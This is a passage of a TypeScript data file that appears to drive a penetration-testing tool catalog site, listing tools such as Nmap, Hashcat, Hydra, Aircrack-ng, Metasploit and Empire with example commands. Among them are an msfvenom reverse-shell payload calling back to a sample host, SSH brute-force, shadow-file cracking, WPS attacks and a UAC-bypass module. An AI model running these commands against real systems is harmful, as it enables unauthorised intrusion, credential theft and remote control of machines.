import { Tool } from "@/types";

export const categories = [
  {
    name: "Information Gathering",
    description: "Tools for reconnaissance and information collection",
    icon: "Search",
    toolCount: 6
  },
  {
    name: "Cryptography",
    description: "Encryption, decryption, and hash tools",
    icon: "Lock", 
    toolCount: 3
  },
  {
    name: "Web Security",
    description: "Web application security testing tools",
    icon: "Globe",
    toolCount: 4
  },
  {
    name: "Network Security",
    description: "Network analysis and security tools",
    icon: "Shield",
    toolCount: 4
  },
  {
    name: "Wireless Hacking",
    description: "Wireless network security testing tools",
    icon: "Wifi",
    toolCount: 4
  },
  {
    name: "Social Engineering",
    description: "Social engineering and phishing tools",
    icon: "Users",
    toolCount: 3
  },
  {
    name: "Exploitation",
    description: "Exploitation frameworks and tools",
    icon: "Zap",
    toolCount: 4
  },
  {
    name: "Password Cracking",
    description: "Password cracking and recovery tools",
    icon: "Key",
    toolCount: 3
  },
  {
    name: "Vulnerability Scanning",
    description: "Vulnerability assessment and scanning tools",
    icon: "Search",
    toolCount: 4
  },
  {
    name: "Forensics",
    description: "Digital forensics and investigation tools",
    icon: "FileSearch",
    toolCount: 4
  },
  {
    name: "Web Assessment",
    description: "Web application assessment tools",
    icon: "Globe",
    toolCount: 3
  }
];

export const toolsData: { [key: string]: Tool[] } = {
  "information-gathering": [
    {
      id: "ip-lookup",
      name: "IP Lookup",
      description: "Find the geolocation of any IP address",
      longDescription: "This tool allows you to find the geolocation of any IP address. It uses a third-party API to find the location of the IP address and displays it on a map.",
      category: "Information Gathering",
      difficulty: "Beginner",
      lastUpdated: "2024-01-15",
      icon: "🌍",
      commands: [
        "curl ipinfo.io",
        "curl ipinfo.io/8.8.8.8",
        "curl ipinfo.io/8.8.8.8/country"
      ],
      useCases: [
        "Find the location of an IP address",
        "Identify the ISP of an IP address",
        "Identify the country of an IP address"
      ],
      installation: {
        linux: "No installation required",
        windows: "No installation required", 
        mac: "No installation required"
      },
      examples: [
        {
          command: "curl ipinfo.io",
          description: "Find the location of your IP address"
        },
        {
          command: "curl ipinfo.io/8.8.8.8",
          description: "Find the location of Google's DNS server"
        }
      ]
    },
    {
      id: "nmap",
      name: "Nmap",
      description: "Network discovery and security auditing",
      longDescription: "Nmap (Network Mapper) is a free and open source utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime.",
      category: "Information Gathering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-10",
      icon: "🔍",
      commands: [
        "nmap -sS target_ip",
        "nmap -sV target_ip",
        "nmap -O target_ip",
        "nmap -A target_ip"
      ],
      useCases: [
        "Network discovery",
        "Port scanning",
        "Service detection",
        "OS fingerprinting",
        "Vulnerability scanning"
      ],
      installation: {
        linux: "sudo apt-get install nmap",
        windows: "Download from https://nmap.org/download.html",
        mac: "brew install nmap"
      },
      examples: [
        {
          command: "nmap -sS 192.168.1.1",
          description: "TCP SYN scan of target"
        },
        {
          command: "nmap -sV -p 80,443 target.com",
          description: "Service version detection on specific ports"
        }
      ]
    },
    {
      id: "masscan",
      name: "Masscan",
      description: "High-speed port scanner",
      longDescription: "Masscan is an Internet-scale port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10 million packets per second, from a single machine.",
      category: "Information Gathering",
      commands: [
        "masscan -p80,8000-8100 10.0.0.0/8",
        "masscan -p1-65535 192.168.1.0/24 --rate=1000",
        "masscan --top-ports 100 target_range"
      ],
      useCases: [
        "Large-scale port scanning",
        "Network reconnaissance",
        "Fast service discovery",
        "Internet-wide scanning"
      ],
      installation: {
        linux: "sudo apt-get install masscan",
        windows: "Download binary from GitHub releases",
        mac: "brew install masscan"
      },
      examples: [
        {
          command: "masscan -p80 192.168.1.0/24",
          description: "Scan port 80 on entire subnet"
        }
      ]
    },
    {
      id: "shodan",
      name: "Shodan",
      description: "Search engine for Internet-connected devices",
      longDescription: "Shodan is a search engine that lets users find specific types of computers connected to the internet using a variety of filters.",
      category: "Information Gathering",
      commands: [
        "shodan search apache",
        "shodan host 8.8.8.8",
        "shodan count apache"
      ],
      useCases: [
        "Internet device discovery",
        "Vulnerability research",
        "Network monitoring",
        "IoT device scanning"
      ],
      installation: {
        linux: "pip install shodan",
        windows: "pip install shodan",
        mac: "pip install shodan"
      },
      examples: [
        {
          command: "shodan search \"default password\"",
          description: "Find devices with default passwords"
        }
      ]
    },
    {
      id: "whois",
      name: "Whois",
      description: "Domain registration information lookup",
      longDescription: "Whois is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource.",
      category: "Information Gathering",
      commands: [
        "whois example.com",
        "whois -h whois.arin.net 8.8.8.8"
      ],
      useCases: [
        "Domain information gathering",
        "IP address ownership lookup",
        "Registration details investigation"
      ],
      installation: {
        linux: "sudo apt-get install whois",
        windows: "Built into Windows",
        mac: "Built into macOS"
      },
      examples: [
        {
          command: "whois google.com",
          description: "Get domain registration info for Google"
        }
      ]
    },
    {
      id: "theharvester",
      name: "theHarvester",
      description: "Email, subdomain and people names harvester",
      longDescription: "theHarvester is a very simple to use, yet powerful and effective tool designed to be used in the early stages of a penetration test or red team engagement.",
      category: "Information Gathering",
      commands: [
        "theharvester -d example.com -l 500 -b google",
        "theharvester -d example.com -b all"
      ],
      useCases: [
        "Email harvesting",
        "Subdomain enumeration",
        "Social engineering preparation"
      ],
      installation: {
        linux: "git clone https://github.com/laramies/theHarvester.git",
        windows: "Download from GitHub",
        mac: "git clone https://github.com/laramies/theHarvester.git"
      },
      examples: [
        {
          command: "theharvester -d target.com -b google",
          description: "Harvest emails from Google search"
        }
      ]
    }
  ],
  "cryptography": [
    {
      id: "hash-generator",
      name: "Hash Generator",
      description: "Generate various types of cryptographic hashes",
      longDescription: "A comprehensive hashing tool that supports multiple hash algorithms including MD5, SHA-1, SHA-256, SHA-512, and more. Essential for data integrity verification, password hashing, and digital forensics.",
      category: "Cryptography",
      commands: [
        "echo 'text' | md5sum",
        "echo 'text' | sha256sum",
        "echo 'text' | sha512sum",
        "openssl dgst -md5 file.txt"
      ],
      useCases: [
        "Password hashing",
        "File integrity verification",
        "Digital forensics",
        "Data deduplication",
        "Cryptographic applications"
      ],
      installation: {
        linux: "Built-in (coreutils package)",
        windows: "Use PowerShell Get-FileHash or install OpenSSL",
        mac: "Built-in or brew install openssl"
      },
      examples: [
        {
          command: "echo 'hello world' | sha256sum",
          description: "Generate SHA-256 hash of text"
        },
        {
          command: "md5sum file.txt",
          description: "Calculate MD5 hash of a file"
        },
        {
          command: "openssl dgst -sha512 document.pdf",
          description: "Generate SHA-512 hash using OpenSSL"
        }
      ]
    },
    {
      id: "hashcat",
      name: "Hashcat",
      description: "Advanced password recovery tool",
      longDescription: "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.",
      category: "Cryptography",
      commands: [
        "hashcat -m 0 hash.txt wordlist.txt",
        "hashcat -m 1000 ntlm_hash.txt rockyou.txt",
        "hashcat -a 3 -m 0 hash.txt ?d?d?d?d"
      ],
      useCases: [
        "Password cracking",
        "Hash analysis",
        "Security testing",
        "Forensic investigations"
      ],
      installation: {
        linux: "sudo apt-get install hashcat",
        windows: "Download from hashcat.net",
        mac: "brew install hashcat"
      },
      examples: [
        {
          command: "hashcat -m 0 -a 0 hash.txt wordlist.txt",
          description: "Dictionary attack on MD5 hash"
        }
      ]
    },
    {
      id: "john",
      name: "John the Ripper",
      description: "Password cracking tool",
      longDescription: "John the Ripper is a free password cracking software tool. It combines several cracking modes in one program and is fully configurable for your particular needs.",
      category: "Cryptography",
      commands: [
        "john --wordlist=rockyou.txt hash.txt",
        "john --show hash.txt",
        "john --incremental hash.txt"
      ],
      useCases: [
        "Password auditing",
        "Hash cracking",
        "Security assessment"
      ],
      installation: {
        linux: "sudo apt-get install john",
        windows: "Download from openwall.com",
        mac: "brew install john"
      },
      examples: [
        {
          command: "john --wordlist=/usr/share/wordlists/rockyou.txt shadow",
          description: "Crack shadow file passwords"
        }
      ]
    }
  ],
  "web-security": [
    {
      id: "burp-suite",
      name: "Burp Suite",
      description: "Web application security testing platform",
      longDescription: "Burp Suite is a leading range of cybersecurity tools, brought to you by PortSwigger. We believe in giving you the most advanced tools to find more vulnerabilities, faster.",
      category: "Web Security",
      commands: [
        "java -jar burpsuite_community.jar",
        "Configure proxy settings in browser"
      ],
      useCases: [
        "Web application penetration testing",
        "API security testing",
        "Manual security testing",
        "Automated vulnerability scanning"
      ],
      installation: {
        linux: "Download from portswigger.net",
        windows: "Download from portswigger.net",
        mac: "Download from portswigger.net"
      },
      examples: [
        {
          command: "Set browser proxy to 127.0.0.1:8080",
          description: "Configure browser to use Burp proxy"
        }
      ]
    },
    {
      id: "nikto",
      name: "Nikto",
      description: "Web server scanner",
      longDescription: "Nikto is an Open Source web server scanner which performs comprehensive tests against web servers for multiple items.",
      category: "Web Security",
      commands: [
        "nikto -h http://target.com",
        "nikto -h target.com -p 80,443,8080"
      ],
      useCases: [
        "Web server vulnerability scanning",
        "Configuration testing",
        "Security assessment"
      ],
      installation: {
        linux: "sudo apt-get install nikto",
        windows: "Download from GitHub",
        mac: "brew install nikto"
      },
      examples: [
        {
          command: "nikto -h https://example.com",
          description: "Scan website for vulnerabilities"
        }
      ]
    },
    {
      id: "owasp-zap",
      name: "OWASP ZAP",
      description: "Web application security scanner",
      longDescription: "The OWASP Zed Attack Proxy (ZAP) is one of the world's most popular free security tools and is actively maintained by hundreds of international volunteers.",
      category: "Web Security",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-12",
      icon: "🛡️",
      commands: [
        "zap.sh -daemon -port 8080",
        "zap.sh -quickurl http://target.com"
      ],
      useCases: [
        "Automated vulnerability scanning",
        "Manual penetration testing",
        "API security testing"
      ],
      installation: {
        linux: "sudo apt-get install zaproxy",
        windows: "Download from owasp.org",
        mac: "brew install zaproxy"
      },
      examples: [
        {
          command: "zap.sh -quickurl https://example.com",
          description: "Quick scan of target website"
        }
      ]
    },
    {
      id: "sqlmap",
      name: "SQLMap",
      description: "Automatic SQL injection tool",
      longDescription: "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.",
      category: "Web Security",
      difficulty: "Advanced",
      lastUpdated: "2024-01-08",
      icon: "💉",
      commands: [
        "sqlmap -u 'http://target.com/page?id=1'",
        "sqlmap -r request.txt",
        "sqlmap -u 'url' --dbs"
      ],
      useCases: [
        "SQL injection testing",
        "Database enumeration",
        "Data extraction"
      ],
      installation: {
        linux: "git clone https://github.com/sqlmapproject/sqlmap.git",
        windows: "Download from sqlmap.org",
        mac: "brew install sqlmap"
      },
      examples: [
        {
          command: "sqlmap -u 'http://example.com/page?id=1' --dbs",
          description: "Test for SQL injection and enumerate databases"
        }
      ]
    }
  ],
  "network-security": [
    {
      id: "wireshark",
      name: "Wireshark",
      description: "Network protocol analyzer",
      longDescription: "Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level.",
      category: "Network Security",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-15",
      icon: "📡",
      commands: [
        "wireshark",
        "tshark -i eth0",
        "tshark -r capture.pcap"
      ],
      useCases: [
        "Network troubleshooting",
        "Protocol analysis",
        "Security investigation",
        "Network forensics"
      ],
      installation: {
        linux: "sudo apt-get install wireshark",
        windows: "Download from wireshark.org",
        mac: "brew install wireshark"
      },
      examples: [
        {
          command: "tshark -i any -c 100",
          description: "Capture 100 packets from any interface"
        }
      ]
    },
    {
      id: "nessus",
      name: "Nessus",
      description: "Vulnerability scanner",
      longDescription: "Nessus is a proprietary vulnerability scanner developed by Tenable, Inc. It is free of charge for personal use in a non-enterprise environment.",
      category: "Network Security",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-10",
      icon: "🔍",
      commands: [
        "sudo systemctl start nessusd",
        "Access web interface at https://localhost:8834"
      ],
      useCases: [
        "Vulnerability assessment",
        "Compliance checking",
        "Network security auditing"
      ],
      installation: {
        linux: "Download .deb/.rpm from tenable.com",
        windows: "Download installer from tenable.com",
        mac: "Download .dmg from tenable.com"
      },
      examples: [
        {
          command: "Create scan policy in web interface",
          description: "Configure vulnerability scan settings"
        }
      ]
    },
    {
      id: "netcat",
      name: "Netcat",
      description: "Network Swiss Army knife",
      longDescription: "Netcat is a computer networking utility for reading from and writing to network connections using TCP or UDP. It is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts.",
      category: "Network Security",
      difficulty: "Beginner",
      lastUpdated: "2024-01-14",
      icon: "🔧",
      commands: [
        "nc -l -p 1234",
        "nc target.com 80",
        "nc -v -n target 1-1000"
      ],
      useCases: [
        "Port scanning",
        "Banner grabbing",
        "File transfers",
        "Remote shell access"
      ],
      installation: {
        linux: "sudo apt-get install netcat",
        windows: "Download ncat with nmap",
        mac: "Built-in or brew install netcat"
      },
      examples: [
        {
          command: "nc -v target.com 80",
          description: "Connect to web server and grab banner"
        }
      ]
    },
    {
      id: "tcpdump",
      name: "tcpdump",
      description: "Command-line packet analyzer",
      longDescription: "tcpdump is a common packet analyzer that runs under the command line. It allows the user to display TCP/IP and other packets being transmitted or received over a network.",
      category: "Network Security",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-13",
      icon: "📊",
      commands: [
        "tcpdump -i eth0",
        "tcpdump -w capture.pcap",
        "tcpdump -r capture.pcap"
      ],
      useCases: [
        "Network traffic analysis",
        "Packet capture",
        "Network debugging"
      ],
      installation: {
        linux: "sudo apt-get install tcpdump",
        windows: "Use WinDump alternative",
        mac: "Built-in"
      },
      examples: [
        {
          command: "tcpdump -i eth0 -w capture.pcap",
          description: "Capture packets to file"
        }
      ]
    }
  ],
  "wireless-hacking": [
    {
      id: "aircrack-ng",
      name: "Aircrack-ng",
      description: "Wireless network security testing suite",
      longDescription: "Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security: monitoring, attacking, testing, and cracking.",
      category: "Wireless Hacking",
      difficulty: "Advanced",
      lastUpdated: "2024-01-15",
      icon: "📶",
      commands: [
        "airmon-ng start wlan0",
        "airodump-ng wlan0mon",
        "aircrack-ng capture.cap"
      ],
      useCases: [
        "WiFi password cracking",
        "Wireless monitoring",
        "WEP/WPA security testing"
      ],
      installation: {
        linux: "sudo apt-get install aircrack-ng",
        windows: "Use Kali Linux VM",
        mac: "brew install aircrack-ng"
      },
      examples: [
        {
          command: "aircrack-ng -w wordlist.txt capture.cap",
          description: "Crack WPA password using wordlist"
        }
      ]
    },
    {
      id: "kismet",
      name: "Kismet",
      description: "Wireless network detector and intrusion detection system",
      longDescription: "Kismet is a wireless network and device detector, sniffer, wardriving tool, and WIDS (wireless intrusion detection) framework.",
      category: "Wireless Hacking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-12",
      icon: "📡",
      commands: [
        "kismet",
        "kismet_server",
        "kismet_client"
      ],
      useCases: [
        "Wireless network discovery",
        "Wardriving",
        "Intrusion detection"
      ],
      installation: {
        linux: "sudo apt-get install kismet",
        windows: "Use Kali Linux VM",
        mac: "brew install kismet"
      },
      examples: [
        {
          command: "kismet -c wlan0",
          description: "Start monitoring on wireless interface"
        }
      ]
    },
    {
      id: "reaver",
      name: "Reaver",
      description: "WPS brute force attack tool",
      longDescription: "Reaver implements a brute force attack against WiFi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases.",
      category: "Wireless Hacking",
      difficulty: "Advanced",
      lastUpdated: "2024-01-10",
      icon: "🔓",
      commands: [
        "reaver -i wlan0mon -b target_bssid -vv",
        "reaver -i wlan0mon -b target_bssid -c channel"
      ],
      useCases: [
        "WPS PIN cracking",
        "WiFi password recovery",
        "Wireless security testing"
      ],
      installation: {
        linux: "sudo apt-get install reaver",
        windows: "Use Kali Linux VM",
        mac: "Compile from source"
      },
      examples: [
        {
          command: "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv",
          description: "Attack WPS on target AP"
        }
      ]
    },
    {
      id: "wifite",
      name: "Wifite",
      description: "Automated wireless attack tool",
      longDescription: "Wifite is a tool to audit WEP or WPA encrypted wireless networks. It uses aircrack-ng, pyrit, reaver, tshark tools to perform the audit.",
      category: "Wireless Hacking",
      difficulty: "Beginner",
      lastUpdated: "2024-01-08",
      icon: "⚡",
      commands: [
        "wifite",
        "wifite --wep --wpa --wps",
        "wifite -e target_network"
      ],
      useCases: [
        "Automated WiFi cracking",
        "Multiple attack methods",
        "Wireless penetration testing"
      ],
      installation: {
        linux: "sudo apt-get install wifite",
        windows: "Use Kali Linux VM",
        mac: "pip install wifite2"
      },
      examples: [
        {
          command: "wifite --wpa",
          description: "Automated WPA cracking on all networks"
        }
      ]
    }
  ],
  "social-engineering": [
    {
      id: "set",
      name: "Social Engineer Toolkit",
      description: "Social engineering penetration testing framework",
      longDescription: "The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element.",
      category: "Social Engineering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-15",
      icon: "🎭",
      commands: [
        "setoolkit",
        "se-toolkit"
      ],
      useCases: [
        "Phishing campaigns",
        "Social engineering attacks",
        "Human factor testing"
      ],
      installation: {
        linux: "sudo apt-get install set",
        windows: "Use Kali Linux VM",
        mac: "git clone https://github.com/trustedsec/social-engineer-toolkit"
      },
      examples: [
        {
          command: "setoolkit",
          description: "Launch SET interactive menu"
        }
      ]
    },
    {
      id: "gophish",
      name: "Gophish",
      description: "Open-source phishing toolkit",
      longDescription: "Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements.",
      category: "Social Engineering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-12",
      icon: "🎣",
      commands: [
        "./gophish",
        "Access web interface at https://localhost:3333"
      ],
      useCases: [
        "Phishing simulations",
        "Employee awareness training",
        "Security assessments"
      ],
      installation: {
        linux: "Download binary from GitHub",
        windows: "Download binary from GitHub",
        mac: "Download binary from GitHub"
      },
      examples: [
        {
          command: "Create campaign in web interface",
          description: "Set up phishing simulation"
        }
      ]
    },
    {
      id: "maltego",
      name: "Maltego",
      description: "Open source intelligence and forensics application",
      longDescription: "Maltego is an open source intelligence (OSINT) and graphical link analysis tool for gathering and connecting information for investigative tasks.",
      category: "Social Engineering",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-10",
      icon: "🕸️",
      commands: [
        "maltego",
        "Launch from applications menu"
      ],
      useCases: [
        "OSINT gathering",
        "Link analysis",
        "Investigation mapping"
      ],
      installation: {
        linux: "Download from maltego.com",
        windows: "Download from maltego.com",
        mac: "Download from maltego.com"
      },
      examples: [
        {
          command: "Create new graph in GUI",
          description: "Start OSINT investigation"
        }
      ]
    }
  ],
  "exploitation": [
    {
      id: "metasploit",
      name: "Metasploit Framework",
      description: "Penetration testing framework",
      longDescription: "The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code.",
      category: "Exploitation",
      difficulty: "Advanced",
      lastUpdated: "2024-01-15",
      icon: "💥",
      commands: [
        "msfconsole",
        "msfvenom -p payload LHOST=ip LPORT=port -f format",
        "use exploit/windows/smb/ms17_010_eternalblue"
      ],
      useCases: [
        "Exploit development",
        "Penetration testing",
        "Payload generation",
        "Post-exploitation"
      ],
      installation: {
        linux: "sudo apt-get install metasploit-framework",
        windows: "Download installer from rapid7.com",
        mac: "brew install metasploit"
      },
      examples: [
        {
          command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe",
          description: "Generate Windows reverse shell payload"
        }
      ]
    },
    {
      id: "cobaltstrike",
      name: "Cobalt Strike",
      description: "Adversary simulation and red team operations",
      longDescription: "Cobalt Strike is software for Adversary Simulations and Red Team Operations. It gives you a post-exploitation agent and covert channels to emulate a quiet long-term embedded actor.",
      category: "Exploitation",
      difficulty: "Advanced",
      lastUpdated: "2024-01-12",
      icon: "🔴",
      commands: [
        "./teamserver host password profile",
        "Connect via GUI client"
      ],
      useCases: [
        "Red team operations",
        "Adversary simulation",
        "Post-exploitation",
        "Command and control"
      ],
      installation: {
        linux: "Commercial license required",
        windows: "Commercial license required",
        mac: "Commercial license required"
      },
      examples: [
        {
          command: "beacon> shell whoami",
          description: "Execute system command via beacon"
        }
      ]
    },
    {
      id: "empire",
      name: "PowerShell Empire",
      description: "Post-exploitation framework",
      longDescription: "Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.",
      category: "Exploitation",
      difficulty: "Advanced",
      lastUpdated: "2024-01-10",
      icon: "👑",
      commands: [
        "./empire",
        "use stager/multi/launcher",
        "interact agent_name"
      ],
      useCases: [
        "Post-exploitation",
        "Agent management",
        "Privilege escalation",
        "Lateral movement"
      ],
      installation: {
        linux: "git clone https://github.com/EmpireProject/Empire.git",
        windows: "Use Kali Linux VM",
        mac: "git clone https://github.com/EmpireProject/Empire.git"
      },
      examples: [
        {
          command: "usemodule privesc/bypassuac_eventvwr",
          description: "Use UAC bypass module"
        }
      ]
    },
    {
      id: "beef",
      name: "BeEF",
      description: "Browser exploitation framework",
      longDescription: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.",
      category: "Exploitation",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-08",
      icon: "🥩",
      commands: [
        "./beef",
        "Access web interface at http://localhost:3000/ui/panel"
      ],
      useCases: [
        "Browser exploitation",
        "Client-side attacks",
        "Social engineering",
        "Web application testing"
      ],
      installation: {
        linux: "sudo apt-get install beef-xss",
        windows: "Use Kali Linux VM",
        mac: "brew install beef"
      },
      examples: [
        {
          command: "Hook browser with JavaScript payload",
          description: "Execute browser exploitation modules"
        }
      ]
    }
  ],
  "password-cracking": [
    {
      id: "hashcat-advanced",
      name: "Hashcat",
      description: "Advanced password recovery tool",
      longDescription: "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.",
      category: "Password Cracking",
      difficulty: "Advanced",
      lastUpdated: "2024-01-15",
      icon: "🔨",
      commands: [
        "hashcat -m 0 hash.txt wordlist.txt",
        "hashcat -m 1000 ntlm_hash.txt rockyou.txt",
        "hashcat -a 3 -m 0 hash.txt ?d?d?d?d"
      ],
      useCases: [
        "Password cracking",
        "Hash analysis",
        "Security testing",
        "Forensic investigations"
      ],
      installation: {
        linux: "sudo apt-get install hashcat",
        windows: "Download from hashcat.net",
        mac: "brew install hashcat"
      },
      examples: [
        {
          command: "hashcat -m 0 -a 0 hash.txt wordlist.txt",
          description: "Dictionary attack on MD5 hash"
        }
      ]
    },
    {
      id: "john-advanced",
      name: "John the Ripper",
      description: "Password cracking tool",
      longDescription: "John the Ripper is a free password cracking software tool. It combines several cracking modes in one program and is fully configurable for your particular needs.",
      category: "Password Cracking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-12",
      icon: "🔪",
      commands: [
        "john --wordlist=rockyou.txt hash.txt",
        "john --show hash.txt",
        "john --incremental hash.txt"
      ],
      useCases: [
        "Password auditing",
        "Hash cracking",
        "Security assessment"
      ],
      installation: {
        linux: "sudo apt-get install john",
        windows: "Download from openwall.com",
        mac: "brew install john"
      },
      examples: [
        {
          command: "john --wordlist=/usr/share/wordlists/rockyou.txt shadow",
          description: "Crack shadow file passwords"
        }
      ]
    },
    {
      id: "hydra",
      name: "Hydra",
      description: "Network login cracker",
      longDescription: "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.",
      category: "Password Cracking",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-10",
      icon: "🐙",
      commands: [
        "hydra -l admin -P passwords.txt ssh://target.com",
        "hydra -L users.txt -P passwords.txt ftp://target.com",
        "hydra -l admin -p password rdp://target.com"
      ],
      useCases: [
        "Brute force attacks",
        "Network service testing",
        "Password auditing"
      ],
      installation: {
        linux: "sudo apt-get install hydra",
        windows: "Download from GitHub",
        mac: "brew install hydra"
      },
      examples: [
        {
          command: "hydra -l admin -P rockyou.txt ssh://192.168.1.100",
          description: "SSH brute force attack"
        }
      ]
    }
  ],
  "vulnerability-scanning": [
    {
      id: "openvas",
      name: "OpenVAS",
      description: "Open source vulnerability scanner",
      longDescription: "OpenVAS is a full-featured vulnerability scanner. Its capabilities include unauthenticated testing, authenticated testing, various high level and low level Internet and industrial protocols.",
      category: "Vulnerability Scanning",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-15",
      icon: "🔍",
      commands: [
        "sudo gvm-setup",
        "sudo gvm-start",
        "Access web interface at https://localhost:9392"
      ],
      useCases: [
        "Vulnerability assessment",
        "Compliance scanning",
        "Security auditing"
      ],
      installation: {
        linux: "sudo apt-get install openvas",
        windows: "Use virtual appliance",
        mac: "Use virtual appliance"
      },
      examples: [
        {
          command: "Create scan task in web interface",
          description: "Configure vulnerability scan"
        }
      ]
    },
    {
      id: "nuclei",
      name: "Nuclei",
      description: "Fast vulnerability scanner",
      longDescription: "Nuclei is a fast tool for configurable targeted vulnerability scanning based on templates offering massive extensibility and ease of use.",
      category: "Vulnerability Scanning",
      difficulty: "Beginner",
      lastUpdated: "2024-01-12",
      icon: "⚡",
      commands: [
        "nuclei -u https://target.com",
        "nuclei -l targets.txt",
        "nuclei -t cves/ -u target.com"
      ],
      useCases: [
        "Fast vulnerability scanning",
        "Template-based testing",
        "CI/CD integration"
      ],
      installation: {
        linux: "GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei",
        windows: "Download binary from GitHub",
        mac: "brew install nuclei"
      },
      examples: [
        {
          command: "nuclei -u https://example.com -t cves/",
          description: "Scan for known CVEs"
        }
      ]
    },
    {
      id: "nessus-advanced",
      name: "Nessus Professional",
      description: "Professional vulnerability scanner",
      longDescription: "Nessus Professional is the industry's most widely-used vulnerability assessment solution for security practitioners.",
      category: "Vulnerability Scanning",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-10",
      icon: "🏢",
      commands: [
        "sudo systemctl start nessusd",
        "Access web interface at https://localhost:8834"
      ],
      useCases: [
        "Enterprise vulnerability scanning",
        "Compliance auditing",
        "Risk assessment"
      ],
      installation: {
        linux: "Download from tenable.com",
        windows: "Download from tenable.com",
        mac: "Download from tenable.com"
      },
      examples: [
        {
          command: "Configure credentialed scan",
          description: "Set up authenticated vulnerability scan"
        }
      ]
    },
    {
      id: "qualys",
      name: "Qualys VMDR",
      description: "Cloud-based vulnerability management",
      longDescription: "Qualys VMDR (Vulnerability Management, Detection and Response) is a cloud-based service that gives you immediate global visibility into where your IT systems might be vulnerable to the latest Internet threats.",
      category: "Vulnerability Scanning",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-08",
      icon: "☁️",
      commands: [
        "Access via web portal",
        "Configure scanner appliances"
      ],
      useCases: [
        "Continuous monitoring",
        "Asset discovery",
        "Threat prioritization"
      ],
      installation: {
        linux: "Cloud-based service",
        windows: "Cloud-based service",
        mac: "Cloud-based service"
      },
      examples: [
        {
          command: "Schedule recurring scans",
          description: "Set up automated vulnerability assessments"
        }
      ]
    }
  ],
  "forensics": [
    {
      id: "autopsy",
      name: "Autopsy",
      description: "Digital forensics platform",
      longDescription: "Autopsy is a digital forensics platform and graphical interface to The Sleuth Kit and other digital forensics tools.",
      category: "Forensics",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-15",
      icon: "🔬",
      commands: [
        "autopsy",
        "Create new case in GUI"
      ],
      useCases: [
        "Disk image analysis",
        "File recovery",
        "Timeline analysis",
        "Digital investigations"
      ],
      installation: {
        linux: "sudo apt-get install autopsy",
        windows: "Download from sleuthkit.org",
        mac: "Download from sleuthkit.org"
      },
      examples: [
        {
          command: "Open disk image in GUI",
          description: "Start forensic analysis of evidence"
        }
      ]
    },
    {
      id: "volatility",
      name: "Volatility",
      description: "Memory forensics framework",
      longDescription: "The Volatility Framework is a completely open collection of tools, implemented in Python under the GNU General Public License, for the extraction of digital artifacts from volatile memory (RAM) samples.",
      category: "Forensics",
      difficulty: "Advanced",
      lastUpdated: "2024-01-12",
      icon: "🧠",
      commands: [
        "volatility -f memory.dump imageinfo",
        "volatility -f memory.dump --profile=Win7SP1x64 pslist",
        "volatility -f memory.dump --profile=Win7SP1x64 netscan"
      ],
      useCases: [
        "Memory analysis",
        "Malware detection",
        "Incident response",
        "Digital forensics"
      ],
      installation: {
        linux: "sudo apt-get install volatility",
        windows: "pip install volatility",
        mac: "pip install volatility"
      },
      examples: [
        {
          command: "volatility -f dump.mem --profile=Win7SP1x64 pslist",
          description: "List running processes from memory dump"
        }
      ]
    },
    {
      id: "sleuthkit",
      name: "The Sleuth Kit",
      description: "Digital investigation tools",
      longDescription: "The Sleuth Kit (TSK) is a library and collection of command line digital forensics tools that allow you to investigate volume and file system data.",
      category: "Forensics",
      difficulty: "Advanced",
      lastUpdated: "2024-01-10",
      icon: "🔍",
      commands: [
        "mmls disk.img",
        "fls -r -o 63 disk.img",
        "icat -o 63 disk.img inode"
      ],
      useCases: [
        "File system analysis",
        "Deleted file recovery",
        "Timeline creation",
        "Evidence examination"
      ],
      installation: {
        linux: "sudo apt-get install sleuthkit",
        windows: "Download from sleuthkit.org",
        mac: "brew install sleuthkit"
      },
      examples: [
        {
          command: "fls -r -m / -o 63 disk.img",
          description: "Create timeline of file activity"
        }
      ]
    },
    {
      id: "binwalk",
      name: "Binwalk",
      description: "Firmware analysis tool",
      longDescription: "Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images.",
      category: "Forensics",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-08",
      icon: "📱",
      commands: [
        "binwalk firmware.bin",
        "binwalk -e firmware.bin",
        "binwalk -M firmware.bin"
      ],
      useCases: [
        "Firmware analysis",
        "File extraction",
        "Reverse engineering",
        "IoT security"
      ],
